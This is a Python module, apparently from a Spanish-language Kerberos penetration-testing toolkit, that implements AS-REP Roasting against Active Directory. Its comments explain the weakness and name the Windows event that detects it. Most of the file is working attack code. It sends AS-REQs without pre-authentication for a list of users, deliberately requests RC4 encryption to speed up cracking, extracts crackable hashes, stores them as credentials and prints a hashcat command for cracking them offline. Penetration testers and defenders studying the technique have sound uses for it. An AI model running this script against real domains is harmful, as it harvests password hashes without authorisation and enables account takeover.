# scripts/kerberos/extraction/asrep_roasting.py
#
# Técnica: AS-REP Roasting
#
# Fundamento:
#   Kerberos exige normalmente que el cliente demuestre quién es ANTES de
#   que el KDC le dé un TGT. Esa demostración es la "pre-autenticación":
#   el cliente envía un timestamp cifrado con su propio hash (PA-ENC-TIMESTAMP).
#
#   Si una cuenta tiene el flag DONT_REQUIRE_PREAUTH activado en AD
#   (userAccountControl bit 22), el KDC devuelve un AS-REP SIN comprobar
#   la identidad del solicitante.
#
#   El AS-REP contiene el enc-part cifrado con el hash de la contraseña del
#   usuario → cualquiera que reciba ese AS-REP puede intentar crackear el
#   hash offline.
#
#   Hashcat modo 18200: $krb5asrep$23$usuario@REALM$<16bytes>$<resto>
#   John modo: --format=krb5asrep
#
# Por qué es peligroso:
#   No necesita credenciales de ningún tipo: solo alcanzabilidad al puerto 88.
#   Las cuentas de servicio suelen tener DONT_REQUIRE_PREAUTH porque algunos
#   servicios legacy no saben hacer pre-auth. Esas cuentas suelen tener
#   contraseñas fuertes pero estáticas → objetivo de crackeo de largo plazo.
#
# Detección:
#   Event ID 4768 con Pre-Authentication Type = 0 (sin pre-auth).
#   Microsoft Defender for Identity / Sentinel lo detectan de serie.

import time
from scripts.base import BaseScript
from core.kerberos_transport import send_krb_message, check_kdc_reachable
from core.asn1_helpers import (
    build_as_req, is_krb_error, is_as_rep, parse_krb_error,
    extract_asrep_hash, KDC_ERR_PREAUTH_REQUIRED, ETYPE_RC4_HMAC
)
from core.output import print_result, print_table, console
from core import session_db


class AsrepRoastingScript(BaseScript):
    name = "asrep-roasting"
    description = "AS-REP Roasting: extrae hashes crackeables de cuentas con DONT_REQUIRE_PREAUTH"

    examples = [
        {"flag": "--userlist",
         "desc": "Fichero con usuarios a probar (uno por línea). Todos sin pre-auth devolverán hash",
         "good": "kerberos --script=asrep-roasting -t 10.129.1.5 -d CORP.LOCAL --userlist users.txt",
         "bad": "kerberos --script=asrep-roasting -t 10.129.1.5 --userlist users.txt  [sin -d/realm el AS-REQ no se puede construir]"},
        {"flag": "-d / --domain",
         "desc": "Realm Kerberos EN MAYÚSCULAS (CORP.LOCAL). Obligatorio.",
         "good": "kerberos --script=asrep-roasting -t 10.129.1.5 -d CORP.LOCAL --userlist users.txt",
         "bad": "kerberos --script=asrep-roasting -t 10.129.1.5 -d corp  [solo el nombre corto sin TLD: el KDC no lo reconocerá como realm válido]"},
    ]

    def run(self, **kwargs):
        userlist_path = kwargs.get("userlist")
        if not userlist_path:
            console.print("[red]Falta --userlist: asrep-roasting necesita un fichero con usuarios.[/red]")
            return

        realm = (self.creds.domain or self.target.domain or "").upper()
        if not realm:
            console.print("[red]Falta -d/--domain: necesario para construir el AS-REQ (realm Kerberos).[/red]")
            return

        try:
            with open(userlist_path) as f:
                users = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        except OSError as e:
            console.print(f"[red]No se pudo leer {userlist_path}: {e}[/red]")
            return

        kdc = self.target.ip
        if not check_kdc_reachable(kdc, timeout=self.target.timeout):
            print_result("KRB", kdc, "fail", f"KDC no alcanzable en {kdc}:88")
            return

        print_result("KRB", kdc, "info",
                     f"asrep-roasting: probando {len(users)} usuario(s) contra {realm}")

        hashes = []
        for username in users:
            hash_str = self._roast_user(kdc, username, realm)
            if hash_str:
                hashes.append((username, hash_str))
                print_result("KRB", kdc, "pwned",
                             f"{username} → hash extraído (modo hashcat 18200)")
                session_db.save_finding(kdc, "KRB", "asrep_hash",
                                         f"{username}: {hash_str[:60]}...")
                session_db.save_credential(kdc, username, hash_str, "asrep_hash",
                                            valid=False, source="asrep_roasting")
            else:
                print_result("KRB", kdc, "info",
                             f"{username} → pre-auth requerida o no existe")
            time.sleep(0.1)

        if hashes:
            console.print()
            print_table(f"Hashes AS-REP ({realm})",
                         ["Usuario", "Hash (inicio)"],
                         [(u, h[:80] + "...") for u, h in hashes])
            console.print()
            console.print("[bold yellow]Para crackear con hashcat:[/bold yellow]")
            console.print(f"  hashcat -m 18200 hashes.txt /ruta/wordlist.txt")
            console.print("[dim]Guarda los hashes completos en session_db "
                           "(db creds -t <ip> para verlos).[/dim]")
            print_result("KRB", kdc, "pwned",
                         f"asrep-roasting: {len(hashes)} hash(es) extraídos")
        else:
            print_result("KRB", kdc, "info",
                         "asrep-roasting: ninguna cuenta vulnerable encontrada")

        return hashes

    def _roast_user(self, kdc: str, username: str, realm: str):
        """
        Envía AS-REQ SIN pre-auth para un usuario. Si el KDC devuelve AS-REP
        (la cuenta tiene DONT_REQUIRE_PREAUTH), extrae el hash crackeable.
        Si el KDC devuelve PREAUTH_REQUIRED, la cuenta existe pero no es vulnerable.

        Nota sobre el etype pedido:
            Pedimos RC4 (etype 23) porque el formato hashcat 18200 para RC4 es
            el más extendido y el más rápido de crackear. Si el DC tiene política
            que prohíbe RC4, podemos pedir AES256 (18200 también lo soporta con
            etype 18), pero el crackeo AES es 50-100x más lento que RC4.
        """
        try:
            req = build_as_req(username, realm, etypes=[ETYPE_RC4_HMAC])
            response = send_krb_message(kdc, req, timeout=self.target.timeout)
        except OSError:
            return None

        if is_as_rep(response):
            try:
                return extract_asrep_hash(response, username, realm)
            except Exception as e:
                print_result("KRB", kdc, "fail",
                             f"{username}: error extrayendo hash: {e}")
                return None

        return None  # PREAUTH_REQUIRED o usuario no existe → no vulnerable
